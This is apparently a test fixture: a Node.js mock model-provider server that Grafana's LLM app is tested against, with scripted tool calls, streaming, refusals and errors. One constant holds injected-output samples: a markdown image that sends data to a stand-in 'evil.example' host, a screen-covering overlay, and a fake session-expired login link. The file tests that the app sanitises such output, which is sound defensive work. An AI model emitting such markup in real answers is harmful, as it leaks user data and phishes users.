// Scripted stand-in for a model provider, run by the mock-llm container. The Playwright tests point Grafana's LLM app
// at it, which sends everything in the Chat Completions format:
//   POST <any prefix>/v1/chat/completions  streamed, or not (the LLM app's health check)
//   GET  /requests                         what the LLM app sent, so tests can check paths, headers and history
// The script: turn 1 calls every tool in parallel, turn 2 fetches the slowest traces it found, turn 3 answers with
// the first line of every tool result. Words in the question and the model name trigger other replies (see below).
import http from 'node:http';

const TURN_1 = [
  ['get_alerts', {}],
  [
    'query_prometheus',
    {
      datasourceUid: 'prometheus',
      expr: 'sum by (service) (rate(traces_spanmetrics_calls_total[5m]))',
      queryType: 'range',
      start: 'now-15m',
      end: 'now',
    },
  ],
  ['query_prometheus', { datasourceUid: 'prometheus', expr: 'up', queryType: 'instant', start: 'now-5m', end: 'now' }],
  [
    'list_prometheus_labels',
    {
      datasourceUid: 'prometheus',
      label: 'service',
      match: 'traces_spanmetrics_calls_total',
      start: 'now-1h',
      end: 'now',
    },
  ],
  [
    'query_loki',
    { datasourceUid: 'loki', logql: '{service_name="hotrod"} |= "error"', limit: 20, start: 'now-15m', end: 'now' },
  ],
  [
    'query_loki',
    {
      datasourceUid: 'loki',
      logql: 'sum by (service_name) (count_over_time({service_name=~".+"}[1m]))',
      start: 'now-15m',
      end: 'now',
    },
  ],
  ['list_loki_labels', { datasourceUid: 'loki', label: 'service_name', start: 'now-1h', end: 'now' }],
  [
    'search_traces',
    {
      datasourceUid: 'tempo',
      traceql: '{ resource.service.name = "frontend" }',
      limit: 5,
      start: 'now-15m',
      end: 'now',
    },
  ],
];

const INJECTED =
  'Injected: ![x](https://evil.example/leak.png?d=secret) <span style="position:fixed;inset:0">cover</span> ' +
  '<a class="datapoints-warning" href="https://evil.example/login">Session expired</a> [docs](https://evil.example/docs)\n\n' +
  'Placeholder http://HOST:PORT/metrics\n\n- [x] alerts checked\n- [ ] logs';

/**
 * The next reply: `{ reasoning?, text?, refusal?, calls?, streamError? }`, a call being `{ id, name, input }`.
 * `question`: the last user message; `results`: tool results since the last answer; `all`: of the whole conversation.
 */
const script = ({ question, results, all }) => {
  if (!results.length) {
    if (question.includes('markdown test')) {
      return { text: INJECTED };
    }
    if (question.includes('flaky')) {
      // fails mid-answer; Continue asks with the resume instruction instead, which gets the normal script
      return { text: 'Looking at the alerts first', streamError: true };
    }
    if (question.includes('refuse')) {
      return { refusal: 'I cannot help with that.' };
    }
    return {
      reasoning: 'Checking alerts, metrics, logs and traces.',
      calls: TURN_1.map(([name, input], i) => ({ id: `call_1_${i}`, name, input })),
    };
  }
  if (results[0].id.startsWith('call_1_')) {
    const search = results.find((r) => r.id === `call_1_${TURN_1.length - 1}`)?.content ?? '';
    // the three slowest traces: several trace views in one conversation
    const ids = [...search.matchAll(/^([0-9a-f]{16,32}) root=/gm)].map((m) => m[1]).slice(0, 3);
    return {
      calls: (ids.length ? ids : ['0000000000000000']).map((traceId, i) => ({
        id: `call_2_${i}`,
        name: 'get_trace',
        input: { datasourceUid: 'tempo', traceId },
      })),
    };
  }
  const lines = all.map((r) => `- ${r.content.split('\n')[0]}`);
  return {
    text: `**Mock investigation done.**\n\n${lines.join('\n')}\n\nFollow-ups: Which traces are slowest? | Is payments running?`,
  };
};

/** What the script needs from a request: tool results are the tool messages after the last answer. */
const read = ({ messages }) => {
  const tools = (msgs) =>
    msgs.filter((m) => m.role === 'tool').map((m) => ({ id: m.tool_call_id, content: String(m.content) }));
  const roles = messages.map((m) => m.role);
  const lastUser = roles.lastIndexOf('user');
  const lastAssistant = roles.lastIndexOf('assistant');
  return {
    question: JSON.stringify(messages[lastUser]?.content ?? ''),
    results: lastAssistant > lastUser ? tools(messages.slice(lastAssistant)) : [],
    all: tools(messages),
  };
};

/** Text in pieces, as a model streams it. */
const pieces = (text = '') => text.match(/[\s\S]{1,40}/g) ?? [];

/** Streams the reply as Chat Completions chunks, tool call arguments in pieces, then the usage when asked for. */
const stream = (body, reply, res, n) => {
  const send = (data) =>
    res.write(
      `data: ${JSON.stringify({ id: `chatcmpl-${n}`, object: 'chat.completion.chunk', created: 0, model: body.model, ...data })}\n\n`
    );
  const calls = reply.calls ?? [];
  const deltas = [
    { role: 'assistant', content: '' },
    ...pieces(reply.reasoning).map((reasoning_content) => ({ reasoning_content })),
    ...pieces(reply.text).map((content) => ({ content })),
    ...pieces(reply.refusal).map((refusal) => ({ refusal })),
    ...calls.flatMap((c, index) => {
      const args = JSON.stringify(c.input);
      return [
        { tool_calls: [{ index, id: c.id, type: 'function', function: { name: c.name, arguments: '' } }] },
        { tool_calls: [{ index, function: { arguments: args.slice(0, 10) } }] },
        { tool_calls: [{ index, function: { arguments: args.slice(10) } }] },
      ];
    }),
  ];
  res.writeHead(200, { 'content-type': 'text/event-stream', 'cache-control': 'no-cache' });
  for (const delta of deltas) {
    send({ choices: [{ index: 0, delta, finish_reason: null }] });
  }
  if (reply.streamError) {
    // an error chunk mid-stream, as OpenRouter sends when the upstream provider fails
    res.write(`data: ${JSON.stringify({ error: { message: 'Provider returned error', code: 502 } })}\n\n`);
    return res.end();
  }
  send({ choices: [{ index: 0, delta: {}, finish_reason: calls.length ? 'tool_calls' : 'stop' }] });
  if (body.stream_options?.include_usage) {
    const usage = { prompt_tokens: 1000, completion_tokens: 100, total_tokens: 1100 };
    send({ choices: [], usage: { ...usage, prompt_tokens_details: { cached_tokens: 400 } } });
  }
  res.write('data: [DONE]\n\n');
  res.end();
};

const fail = (res, status, message) => {
  res.writeHead(status, { 'content-type': 'application/json' });
  res.end(JSON.stringify({ error: { message, type: 'invalid_request_error', param: null, code: null } }));
};

const requests = [];

/** Model names: 'bad-model' is unknown (404), 'status-NNN' fails with that status. */
const handle = async (req, res, raw) => {
  if (req.method === 'GET' && req.url === '/requests') {
    res.writeHead(200, { 'content-type': 'application/json' });
    return res.end(JSON.stringify(requests));
  }
  if (req.method !== 'POST' || !req.url.split('?')[0].endsWith('/v1/chat/completions')) {
    res.writeHead(404);
    return res.end();
  }
  const body = JSON.parse(raw);
  // keep only the start of credentials: the tests check that the LLM app sent one, real keys are not stored
  const headers = { ...req.headers };
  for (const h of ['x-api-key', 'authorization']) {
    if (headers[h]) {
      headers[h] = headers[h].slice(0, 12) + '…';
    }
  }
  requests.push({ url: req.url, headers, body });

  if (body.model === 'bad-model') {
    return fail(res, 404, 'bad-model is not a valid model ID');
  }
  const status = Number(/^status-(\d{3})$/.exec(body.model)?.[1]);
  if (status) {
    return fail(res, status, `mock ${status}`);
  }
  if (!body.stream) {
    res.writeHead(200, { 'content-type': 'application/json' });
    return res.end(
      JSON.stringify({ model: body.model, choices: [{ index: 0, message: { role: 'assistant', content: 'OK' } }] })
    );
  }
  const { question, results, all } = read(body);
  if (!results.length && question.includes('slow start')) {
    await new Promise((resolve) => setTimeout(resolve, 3000)); // time for the test to press Stop
  }
  stream(body, script({ question, results, all }), res, requests.length);
};

http
  .createServer((req, res) => {
    let raw = '';
    req.on('data', (c) => (raw += c));
    req.on('end', () => handle(req, res, raw));
  })
  .listen(8080, () => console.log('mock LLM on :8080'));
